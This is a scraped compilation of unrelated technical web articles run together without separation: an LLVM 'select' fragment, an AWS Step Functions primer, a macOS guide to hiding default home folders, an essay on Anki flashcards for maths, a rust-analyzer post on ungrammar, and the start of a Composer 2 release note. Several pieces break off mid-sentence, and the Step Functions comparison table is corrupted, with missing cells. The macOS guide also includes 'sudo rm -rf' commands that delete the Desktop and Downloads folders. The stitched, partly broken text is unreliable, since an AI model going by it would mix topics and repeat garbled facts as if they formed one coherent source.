<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>

                        <p>The use of serverless computing has become a must nowadays, and some of you may already know a thing or two about Amazon Web Services like <a href="https://dashbird.io/knowledge-base/aws-lambda/introduction-to-aws-lambda/">Lambda Functions</a>, Step Functions, and other services AWS provides. However, if this is the first time you hear about them – fantastic!</p>
<p>In this article, we’ll discuss AWS Step Functions, what they are used for, how to use them, and the advantages or disadvantages that they bring.</p>
<h2><span><b>AWS Step Functions 101</b></span></h2>
<p>Before we can jump into Step Functions, you need to familiarize yourself with the basic structure behind them. Step Functions are an AWS-managed service that uses <a href="https://dashbird.io/knowledge-base/well-architected/finite-state-machine/">Finite-State Machine (FSM)</a> model.</p>
<p><em>Why is that important?</em></p>
<p>By coordinating multiple AWS services into different serverless workflows, you can quickly build and update the apps. Additionally, with Step Functions, you’ll be able to both design and run workflows that’ll bring together various services, including Amazon ECS and AWS Lambda, into feature-rich applications.</p>
<h2><b>FSM Model Explained</b></h2>
<p>The two keywords you need to remember are States and Transitions.</p>
<p><em>Now, why are these words so important?</em></p>
<p>FSM model does a simple job – it uses given states and transitions to complete the tasks at hand. Finite-State Machines are also known as a behavioral model. It’s an abstract machine (system) that can be in 1 (one) state at a time, but it can also switch between a finite number of states.</p>
<p>This machine is defined solely by its states and the relationship these states have between themselves. A good and very straightforward example is the “closed-door example.” The door can either be open or closed, and these are the only two possible states. Now, the transition part is the switch between two states, but you need to provide some input first to get there. When you close the door, you’re placing an input. Additionally, the sequence of opening the closed door is known as the switch between two states (transition).</p>
<figure id="attachment_2958" aria-describedby="caption-attachment-2958"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-1024x626.png" alt="StepFunctions state input and transition" width="640" height="391" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-1024x626.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-300x183.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-768x469.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00.png 1162w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2958"><em>StepFunctions state input and transition</em></figcaption></figure>

<p>You can also apply the same thing to other examples, like your daily life routines. Let’s take “Work, home, bed” as states. From work (state), you take a bus (input) to get home (state), and when you arrive home, you go to bed (another input leading to another state). Tomorrow morning when you wake up and get out of your bed, you’re transitioning from the last state you were in into a previous one, and yet again, taking the bus from home to work is one more transition.</p>
<p>There are other, more complex examples with many more states, inputs, and transitions between them, and the more states you add, the more complex the FSM model becomes.</p>
<p>The conclusion is simple – FSMs are a method of modeling your system by defining the states and transitions between those states.</p>
<h2><span><b>What Are Step Functions?</b></span></h2>
<p>Step Functions are Amazon’s Finite-State Machines service that’s entirely managed while also being serverless. Step Functions are made of state machines (workflows) and tasks. Tasks are individual states or single units of work.</p>
<p>In the following graph, you’ll see an example of Amazon’s State Machine in which the green rectangles represent the states. The result leads to another state, which then leads to the choice that depends on the given input (email or SMS). In this example, the green states were successfully executed, while the white-colored state wasn’t.</p>
<figure id="attachment_2959" aria-describedby="caption-attachment-2959"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-1024x853.png" alt="Amazon's state machine" width="640" height="533" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-1024x853.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-300x250.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-768x640.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03.png 1152w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2959"><em>Amazon’s state machine</em></figcaption></figure>

<p>This entire graph representing the state machine is also known as a Workflow, and there are two types of workflows available.</p>
<h2><span><b>Step Function Workflow</b></span></h2>
<h3><b>Types Of Workflows</b></h3>
<p>Workflows are divided into two groups: Standard and Express workflow. Unlike Standard, the Express workflow is a relatively new option that has been available since last year. The table below shows the differences between these two workflow types.</p>
<table>
<tbody>
<tr>
<td>
<p><b>Workflows</b></p>
</td>
<td>
<p><b>Standard</b></p>
</td>
<td>
<p><b>Express</b></p>
</td>
</tr>
<tr>

</td>

</td>
<td>

</td>

<tr>

</td>

</td>

<tr>
<td>
<p><b>State Transitions</b></p>
</td>

<p>4000+</p>
</td>
<td>
<p>Unlimited</p>
</td>
</tr>
<tr>
<td>
<p><b>Price</b></p>
</td>

</td>
<td>
<p>Number of executions, duration &amp; memory</p>
</td>

<tr>
<td>
<p><b>Execution</b></p>
</td>
<td>
<p>Exactly once</p>
</td>
<td>
<p>At least once</p>
</td>
</tr>
<tr>
<td>
<p><b>Execution History</b></p>
</td>
<td>
<p>API, AWS Console or CloudWatch</p>
</td>
<td>
<p>CloudWatch</p>
</td>
</tr>
</tbody>
</table>

<p>State machines orchestrate the work of Lambda functions. When one function ends, it triggers another function to begin. Although Max Duration is significantly different, Express workflow allows more scalability. Moreover, Express workflow pricing is constructed with more details since users will have to pay for the number of executions, including the duration and memory used for those executions. Standard workflow pricing requires users to pay only for each state transition that occurs.</p>
<p>It’s important to note that Standard workflow is a long-running workflow that has to be durable and auditable. In contrast, the Express workflow type is needed for a much higher workflow and event processing volume.</p>
<h3><b>Workflow Execution</b></h3>
<p>Now that you know the basics, the next step of the way is the execution. To trigger the workflow to start the execution against Step Function API, you can use CloudWatch events as a time trigger or use API Gateway as a proxy.</p>
<h3><span><b>State Types</b></span></h3>
<p>It’s essential to remember that States aren’t the same thing as Tasks since Tasks are one of the State types. There are numerous State types, and all of them have a role to play in the overall workflow:</p>
<ul>
<li>Pass: Pushes input to output.</li>
<li>Task: Takes input and produces output.</li>
<li>Choice: Allows the user to use Branching Logic that’s based on the input.</li>
<li>Wait: It adds delays to State Machine execution.</li>
<li>Success: Has an expected dead-end that stops execution successfully.</li>
<li>Fail: Has an expected dead-end that stops execution with a failure.</li>
<li>Parallel: Allows a user to implement parallel branches in execution, meaning the user can start multiple states at once.</li>
<li>(Dynamic) Mapping: Runs a set of steps for every input item.</li>
</ul>
<h3><span><b>Tasks</b></span></h3>
<p>Tasks are the leading States in which all the work is done. Tasks can call Activities (remote executions):</p>
<ul>
<li>Call an execution on either ECS, EC2 machines, or mobile devices.</li>
<li>Sending SMS notifications and wait for the input.</li>
</ul>
<p>Another constructive element that Step Functions Tasks provide is that it allows you to reach out from your AWS space.</p>
<h3><span><b>Error Handling</b></span></h3>
<p>Error handling includes retries and catch. An excellent example of how does Step Functions work is shown in the graph below:</p>
<figure id="attachment_2960" aria-describedby="caption-attachment-2960"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-1024x882.png" alt="Step Function visual workflow" width="640" height="551" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-1024x882.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-300x258.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-768x661.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21.png 1110w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2960"><em>Step Function visual workflow</em></figcaption></figure>

<p>In this example, you can see the Parallel branching task. This task is a perfect example representing how the entire execution will fail if only one state encounters an error.</p>
<p>Users are provided with Amazon State Language that helps them catch those errors and define all the retries. All this is extremely important for business-critical operations.</p>
<p>Amazon State Language allows you to place a comment, define when the state should start, and define the states and tasks. Moreover, suppose a customer handled an error. In that case, this tool allows you to specify the retries based on the error name, but also to specify the retry interval, as well as the number of retry maximum attempts, and backoff rate, which you can see in the example below:</p>
<figure id="attachment_2961" aria-describedby="caption-attachment-2961"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22-1024x446.png" alt="Amazon State Language: Error handling example" width="640" height="279" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22-1024x446.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22-300x131.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22-768x334.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.23.22.png 1162w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2961"><em>Amazon State Language: Error handling example</em></figcaption></figure>

<p>In case you wish to catch errors, you’ll see why some states weren’t executed and which tasks have failed. See an example of how to catch an error in the graph below:</p>
<figure id="attachment_2962" aria-describedby="caption-attachment-2962"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06-1024x448.png" alt="Amazon State Language: Catch Errors example" width="640" height="280" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06-1024x448.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06-300x131.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06-768x336.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.28.06.png 1166w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2962"><em>Amazon State Language: Catch Errors example</em></figcaption></figure>

<p>The first retry attempt will start at the pre-determined interval, and it gets multiplied by the backoff rate you’ve set.</p>
<p>Error handling is critical because if Parallel tasks execute successfully, but one fails, the entire execution will fail. However, even if the entire execution fails, the state changes will remain intact.</p>
<p>Error handling allows you to track everything that’s happened in the log, and by doing so, you’ll have a better insight on why some errors happened so you could handle the core problem.</p>
<h2><span><b>Step Function Demonstration</b></span></h2>
<h3><b>Choice Step Function Example</b></h3>
<p>You’ll have to input a preferred number into your function. For example, if you chose a number 10 and a customer buys more than ten items from you, the Step Function will execute successfully by following a preferred choice. In case a customer buys less than ten items, the execution will also be successful, but under a different pre-set choice.</p>
<h3><b>Retry Step Function Example</b></h3>
<p>It’s required that you specify the number of retries for all errors and define the interval, along with the number of maximum attempts. There you’ll see that it’s retrying to execute the function until it finally fails.</p>
<p>When the execution fails, you can check the logs in the Execution Event History tab to see how many times it started, but you’ll also be able to see the retries in between each start. You can access detailed information by following the CloudWatch logs link within the Event History tab.</p>
<h3><b>Catch Step Function Example</b></h3>
<p>Input a specific number range, and the function will execute based on the pre-set number. If the execution number goes outside the pre-set number range, the function will report a Range Error. However, if the number goes below the minimal pre-set number higher than zero, the function will report a Custom Error.</p>

It provides much better error handling logic that Lambda Functions, while it’s relatively easy to orchestrate them.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">




<p>Apple computers ship with a custom operating system - macOS, which has a few annoying features.
Among the annoyances a special place has to be reserved for the inability to remove or rename the folders located in <code>$HOME</code>.
Here I describe my way of dealing with this problem.</p>

<h2 id="hidingdefaultfolders">Hiding default folders</h2>

<p>On the web countless macOS users are looking for answers to the same question: “How can I get rid of ‘Desktop’, ‘Documents’, ‘Downloads’, ‘Library’, ‘Movies’, ‘Music’, ‘Pictures’, and ‘Public’ folders?”
Multiple suggestions are provided as possible solutions.
You can: replace the folders with files<a href="#fn:1" id="fnref:1" title="see footnote"><sup>○</sup></a>; hide the folders from ‘Finder’ and make them inaccessible<a href="#fn:2" id="fnref:2" title="see footnote"><sup>○</sup></a>; or simply learn to live with them, as the system will recreate those folders by itself anyway<a href="#fn:3" id="fnref:3" title="see footnote"><sup>○</sup></a>.</p>

<p>I decided to hide.
But, when working in the command line, hiding these folders from Finder is not enough.
Below are three settings that, while not covering all corner cases, go a long way.</p>

<ol>
<li><p>hide from <code>Finder</code> by adding a hidden flag</p>

<pre><code>chflags hidden ~/Desktop ~/Documents ~/Downloads ~/Library
chflags hidden ~/Movies ~/Music ~/Pictures ~/Public
</code></pre></li>
<li><p>hide from <code>ls</code> by creating an alias in <code>.bashrc</code></p>

<pre><code>alias ls='ls -I Desktop -I Documents -I Downloads -I Library\
             -I Movies -I Music -I Pictures -I Public'
</code></pre></li>
<li><p>hide from tab completion by setting a special bash <code>FIGNORE</code><a href="#fn:4" id="fnref:4" title="see footnote"><sup>○</sup></a> variable.</p>

<pre><code>export FIGNORE=Desktop:Documents:Downloads:Library:Movies:Music:Pictures:Public
</code></pre></li>
</ol>

<p>That is it, the folders should mostly be out of view.
And if for whatever reason we need to temporary see them again a simple <code>\ls</code> would bypass the alias and provide us the full list.</p>

<h2 id="creatinganewhierarchy">Creating a new hierarchy</h2>

<p>With the folders out of view we can now move onto creating our own home hierarchy.
This part mostly depends on the needs of the user.
But I would like to offer one piece of advice: make sure your folders start with unique lowercase letters.
This will allow you to auto-complete folder names after typing a single character and offer extra protection against invoking a command on one of those default hidden folders, that start with upper case letters.</p>

<p>In my case the new hierarchy looks like this:</p>

<pre><code>├── base
│   ├─── bin
│   ├─── etc
│   ├─── src
│   └─── var
│
├── desk
│
├── file
│   ├─── articles
│   ├─── books
│   ├─── documents
│   ├─── essays
│   ├─── photos
│   └─── videos
│
└── work
    ├─── active_project_one
    ├─── active_project_two
    └─── zzz
         ├─── inactive_project_one
         ├─── inactive_project_two
         ├─── inactive_project_three
         ├─── inactive_project_four
         └─── ...
</code></pre>

<p><code>'base'</code> is a substitute for <code>'.local'</code>.<br>
<code>'desk'</code> takes the place of the <code>'Desktop'</code> and <code>'Downloads'</code>.<br>
<code>'file'</code> is an aggregate of <code>'Documents'</code>, <code>'Music'</code>, <code>'Pictures'</code>, and <code>'Movies'</code>.<br>
<code>'work'</code> stores various active and completed projects.</p>

<h2 id="linkingdownloadsanddesktop">Linking Downloads and Desktop</h2>

<p>There is one detail remaining: macOS has a useful <code>'Desktop'</code> and now its hidden from us.
On top of that some third party applications put various acquired data into the <code>'Downloads'</code> folder.
Hence, we want to see the contents of those folders within our new file hierarchy.
We achieve this with symbolic links.</p>

<ol>
<li><p>make <code>'Desktop'</code> be a symbolic link for our new folder <code>'desk'</code></p>

<pre><code>sudo rm -rf Desktop
ln -s desk Desktop
</code></pre></li>
<li><p>make <code>'Downloads'</code> be a symbolic link for <code>'Desktop'</code></p>

<pre><code>sudo rm -rf Downloads
ln -s Desktop Downloads
</code></pre></li>
</ol>

<p>And now whenever a file is put into the, now hidden, <code>'Downloads'</code> or <code>'Desktop'</code> folders, it will be placed in our <code>'desk'</code> instead.
Moreover, since <code>'Desktop'</code> is a link to <code>'desk'</code>, whatever is put into the <code>'desk'</code> directory will be visible on the actual desktop on a screen.</p>

<h2 id="theresult">The result</h2>

<pre><code>$ ls ~/
base desk file work

$ cd ~/D&lt;tab&gt;
$ cd ~/D

$ cd ~/d&lt;tab&gt;
$ cd ~/desk
</code></pre>

<h2 id="summary">Summary</h2>

<p>Getting rid of default macOS home directories is hard.
Hiding, instead of trying to delete, seems like an easier and safer solution.
The tricks presented in this article, while not being 100% effective, go along way.
I’ve been using this approach for a few years without accidentally seeing any reminder of those folders during this whole time.</p>

        <p><em>Patrick Stevens is a Developer at G-Research.</em></p>
<p>TL;DR: <em>If you aren’t using <a href="https://apps.ankiweb.net/">Anki</a> or one of its siblings to remember what you learn, you are missing out on literal superpowers. There are specific techniques which I’ve found helpful for using it to learn maths and computer science in particular.</em></p>
<p>This post will discuss extremely briefly what Anki is, but is mainly aimed at helping the student of maths or computer science to squeeze out some extra droplets of productivity from it. If you aren’t already familiar with Anki, go and read Michael Nielsen’s post <a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> as well or instead of this one; if you’re short of time, the main value of the post to someone new to Anki is in the first one-eighth or so, up to but not including “Using Anki to thoroughly read a research paper in an unfamiliar field”. That essay gives a broad-strokes motivation for why one might want to use Anki at all. (Spoiler: it gives you a superhuman memory!)</p>
<h2 id="what-is-anki-">What is Anki?</h2>
<p><a href="https://apps.ankiweb.net/">Anki</a> is a <a href="https://en.wikipedia.org/wiki/Spaced_repetition">spaced repetition system</a>: essentially a program that shows you flashcards at intervals tailored to help you remember their contents. Such systems are based on the observation that while you can’t stop memories from decaying, repeated exposure makes the decay exponentially slower.</p>
<p>So while you need to rehearse a fact frequently when you first come to learn it, reviews can become very sparse very quickly without losing much of your hard-won memory.</p>
<p>Anki is only one such system; other implementations such as SuperMemo and Mnemosyne exist.<br>
There are also applications using the same principles for more specific goals; for example, Memrise is designed for language learning. This post is phrased in terms of Anki, because for historical reasons that’s the one I use.</p>

<p>I’ve placed this section at the start, because I believe that spaced repetition is genuinely a superpower that anyone can acquire. If I can’t hold your interest in this post, I encourage you to glance over these other resources in the hope that one of them does the trick!</p>
<ul>
<li><a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> –&nbsp; a brief introduction to various memory systems with a particular focus on Anki. The money quote: “Anki makes memory a choice”. If you choose to remember something, you can.</li>
<li><a href="https://quantum.country/">Quantum Country</a> – an introduction to quantum computation with integrated spaced-repetition flashcards, which comes with emailed reminders to use the site at intervals. Even if you have no interest in quantum computation, I recommend skimming at least the first bits of the site, so that you can see what really good flashcards based on a text can look like. (Note that some of its cards are not ideal; the site does sometimes fall into the “yes/no” pattern, with flashcards whose answer is a bald “yes” or “no”. Cards of this form aren’t as good as cards which get you to reproduce actually content-based parts of a fact.)</li>
<li><a href="https://www.supermemo.com/en/archives1990-2015/articles/20rules">The Twenty Rules of Formulating Knowledge in Learning</a> – the creator of the spaced-repetition system SuperMemo discusses how to formulate knowledge so that it sticks. Again, even if you don’t use spaced repetition, definitely read this; the advice is absolutely foundational to my understanding of how to learn. A nontrivial amount of this very blog post is essentially specialising some of these rules to the case of maths and computer science.</li>
<li><a href="https://www.reddit.com/r/medicalschoolanki/">Reddit: Medical School Anki</a>, a subreddit with almost 55,000 subscribers at the time of writing. This link is here just to demonstrate that there are fields (such as medicine) in which Anki is very popular and nowhere near as niche as it is in most areas.</li>
</ul>

<p>Absolutely crucial to the effective use of Anki for even a moderate collection of cards is that answering a card should be a single mental motion.</p>
<p>What does this mean? We’ll demonstrate with some positive and negative examples.</p>
<ul>
<li>“What is the capital of France?” is probably answered with a single mental motion: it’s just “Paris”, obtained by a simple lookup in your memory.</li>
<li>“What is 367 times 399?” is many mental motions unless you are really unusually good at mental arithmetic. Almost everyone has to carry out some algorithm to get an answer to this question.</li>
<li>“What is the composition of air?” is probably many mental motions: for example, a lookup of “which gases are in air?” and a number of motions like “what proportion of air is this specific gas?”. Or it could be the various mental motions of “Which gas is the nth most common in air, and what is its proportion in air?” as n varies.</li>
<li>“What is the most common gas in air, and what is its proportion?” is very possibly a single mental motion despite the multiple components in its answer. For me, the knowledge that “nitrogen is the most common gas in air” is intimately bound up with “78% of air is nitrogen”; to answer one question is to access the same mental lump of storage as is required to answer the other question. Of course, for someone else, this may be two distinct facts and two distinct memory lookups.</li>
</ul>
<p>A card that is answered with one mental motion may be multiple motions for someone else; and a question answered with many mental motions may become one motion after you learn some additional fact or part of the model that ties the facts together. So it’s helpful if you personally keep track of what you’re doing to answer a given card, so that you can recognise some of this structure in your own mind.</p>
<p>Any card which is multiple mental motions should be broken down into smaller chunks.</p>
<p>If you’re doing too much work to answer a card, it’s important to notice, so that you can break the card down. And don’t worry that you might “break down a card too much”; if the cards are easy, Anki will exponentially decrease how often it shows them to you. The cost of creating a card that’s too easy is almost entirely in the time it takes you to create the card in the first place; a card that’s too difficult will sap your time and energy again and again.</p>

<p>As an example, recall the <a href="https://en.wikipedia.org/wiki/Ratio_test">ratio test for convergence</a>, likely to be covered in any first course in analysis:</p>
<p><em>Let$\sum_{n=1}^{\infty} a_n$ be a complex series, with each $a_i$ nonzero.<br>
Suppose that there is $a$ such that $|\frac{a_{n+1}}{a_n}| \to a$.<br>
Then, if $a &lt; 1$ then the series converges absolutely; if $a &gt; 1$ then the series diverges.</em></p>
<p>(We’ll discuss its proof in a later section.)</p>
<p>This statement has a number of moving parts, and is definitely much too large to appear as a single card. (Remember the rule of thumb: answering a single card should be a single mental motion.)<br>
How could we formulate this statement in an Anki-friendly way?</p>
<p>My own personal Anki collection contains the following cards. (Anki does allow LaTeX, though I often optimise for speed of card creation and just use plain text, however ugly it ends up. As long as it’s easily legible, it doesn’t need to be pretty.)</p>
<ul>
<li>What conditions exist on the ratio test? (answer: nonzero, sequence of ratios has a limit)</li>
<li>When does the ratio test let us conclude something? (answer: successive ratios converge to something not equal to 1)</li>
<li>Which cases exist on the ratio test? (answer: ratios converge to less than, or greater than, 1)</li>
<li>What can we say from the ratio test if the ratios converge to something less than 1? (answer: converges absolutely)</li>
<li>What can we say from the ratio test if the ratios converge to something greater than 1? (answer: diverges)</li>
<li>What can we say from the ratio test if the ratios converge to 1? (answer: nothing)</li>
<li>Give an example where the ratio test is inconclusive. (answer: <a href="https://en.wikipedia.org/wiki/Harmonic_series_(mathematics)">harmonic series</a>)</li>
</ul>
<p>All these cards are very simple; perhaps they might look laughably simple. This is fine! Remember that Anki will rapidly stop showing you cards you already know. Crucially each card is really a single mental motion to answer.</p>
<p>Note also that information is duplicated between cards. For example, there are two cards saying in slightly different ways that the ratio test talks about when successive ratios converge to something not equal to 1. Again, it’s fine to repeat information, because cards are cheap. Here, the information is duplicated to better facilitate the links between the cards: one card is a general “when can we conclude anything”, and one card is the same information rephrased as “which cases do I need to consider to produce more information here”. Without the additional rephrasing, there’s more of a risk of developing “isolated” clusters of cards; the aim is that given just the prompt “ratio test”, I can reproduce the <em>entire</em> cluster without thinking any further.</p>
<p>And don’t forget to store key examples and counterexamples!</p>

<p>Remembering a definition is rather like remembering the statement of a theorem.<br>
Without further ado, here is my definition of a <a href="https://en.wikipedia.org/wiki/Red-black_tree">red-black tree</a>:</p>
<ul>
<li>What, imprecisely, are the colouring rules on a red-black tree? (“global; local; base-case”)</li>
<li>What are the leaves of a red-black tree? (“null, black”)</li>
<li>What is the base-case colouring rule of a red-black tree? (“leaves are black”)</li>
<li>What is the local colouring rule of a red-black tree? (“red node =&gt; black children”)</li>
<li>What is the global colouring rule of a red-black tree? (“black depth is well defined”)</li>
<li>What is the black depth of a node in a red-black tree? (“the number of black nodes encountered on a path from that node down to a leaf”)</li>
</ul>
<p>Again, there is some duplication (two cards note that the leaves of a red-black tree are coloured black), and all the cards are extremely simple. The point is to make sure not only that the actual <em>content</em> is remembered, but also that the content is interlinked enough that you can reproduce the entire definition from the single prompt “red-black tree”. Moreover, one card is explicitly structural and carries no actual content as such: the card that lists the three types of colouring rule. This card is there solely to allow me to remember which <em>cards</em> are relevant.</p>
<p>Naively, one might create instead a single card, “what is a red-black tree?”. But in my experience, this is too big. If you’re reviewing even 30 cards a day, and …</p></div></div></div>

October 24, 2020 | https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html | <a href="https://web.archive.org/web/*/https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html">archive.org</a>

<p>So, what exactly does “describing syntax trees” mean and why is it useful?
When writing an IDE, one of the core data structure is the concrete syntax tree.
It is a full-fidelity tree which represents the original source code in detail, including parenthesis, comments, and whitespace.
CSTs are used for initial analysis of the language.
They are also a vocabulary type for refactors.
Although the ultimate result of a refactor is a text diff, tree modification is a more convenient internal representation.</p>

<p>At the lowest level, the CST is typically unityped: there’s some <code>Node</code> superclass, which has a collection of <code>Node</code> children and an optional <code>Node</code> parent.
On top of this raw layer, a more AST-like API is provided: <code>Struct</code> has a <code>.name()</code> and a list of <code>.fields()</code>, etc.
This typed API is huge!
For rust-analyzer, it is comprised of more than 130 <em>types</em>!
And it is also more detailed than a typical AST: <code>Struct</code> also has <code>.l_curly()</code> and <code>.r_curly()</code>.</p>
<p>What’s worse, this API changes a lot, especially at the beginning.
You may start with nesting <code>.fields()</code> directly under the <code>Struct</code>, but then introduce a <code>StructFields</code> node for everything between the curly braces to share the code with enum variants.</p>
<p>In short, writing this by hand sucks :-)
Ungrammar is a notation to concisely describe the structure of the syntax tree, which can be used by a code generator to build an API in the target language.
If you’ve heard about <a href="https://www.oilshell.org/blog/2016/12/11.html">ASDL</a>, ungrammar is ASDL for concrete syntax trees.
For rust-analyzer’s case, that means taking the following input:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>Module =
  Attr* Visibility?
  'mod' Name
  (ItemList | ';')
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>And generating the following output:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre><span>impl</span> <span>ast</span><span>::</span><span>AttrsOwner</span>      <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>VisibilityOwner</span> <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>NameOwner</span>       <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>Module</span> <span>{</span>
    <span>pub</span> <span>fn</span> <span>mod_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>item_list</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>ItemList</span><span>&gt;</span>    <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>semicolon_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In typical parser generators, something similar can be achieved by generating <em>both</em> the parser and the syntax tree from the same grammar.
This works to some extent, but has an inherent problem that the shape of the tree you want for the programmatic API, and the shape of the grammar you need to implement the parser are often different.
“Technical” transformations like left-recursion elimination don’t affect the language described by the grammar, but completely change the shape of the parse tree.
In contrast, ungrammar focuses solely on the second task, which radically reduces the complexity of the grammar.
In rust-analyzer, it is paired with a hand-written parser.</p>
<p>Treated as an ordinary (context free) grammar, ungrammar describes a superset of the language.
For example, for programmatic API it might be convenient to treat commas in comma-separate lists as a part of the list element
(rust-analyzer doesn’t do this yet, but it should).
This leads to the following ungrammar, which obviously doesn’t treat commas precisely:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>FieldList =
  '{' Field* '}'

Field:
  Name ':' Type ','?
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Similarly, ungrammar defines binary and unary expressions, but doesn’t specify their relative precedence and associativity.</p>
<p>An interesting side-effect is that the resulting grammars turn out to be pretty human readable.
For example, a full production ready Rust grammar takes about 600 short lines:<br></p>

<p>This might be a good fit for reference documentation!</p>

                    <h2 id="1-what-s-new">1/ What's new?</h2><p>The list of changes and improvements is long, check the <a href="https://github.com/composer/composer/releases/tag/2.0.0">complete changelog</a> if you are interested in reading it all. I will highlight a few key points here.</p><h3 id="performance-improvements">Performance improvements</h3><p>We overhauled pretty much everything from the protocol used between Composer and packagist.org to the dependency resolution, including downloading files in parallel using curl and constraint evaluation optimizations. This leads to massive improvements in terms of both speed and memory usage. The difference depends on your use case, so while I've seen reports of improvements of over 50% to both in some projects, I cannot put an exact number on it. But I am sure you will be positively surprised if you haven't tried Composer 2 yet.</p><p>As a side note to this, <code>require</code>/<code>remove</code> and partial updates are now much faster because Composer will now only load the metadata of the packages which are being changed.</p><figure><img src="https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png" alt="" srcset="https://blog.packagist.com/content/images/size/w600/2020/10/image_2020-10-24_175318.png 600w, https://blog.packagist.com/content/images/size/w1000/2020/10/image_2020-10-24_175318.png 1000w, https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png 1455w" sizes="(min-width: 1200px) 1200px"><figcaption>Time for initial update + install (bootstrapped project, empty cache) shows roughly 60% less time used by Composer 2 with ext-curl enabled</figcaption></figure><h3 id="architectural-changes-and-determinism">Architectural changes and determinism</h3><p>The way dependency updates are done internally was 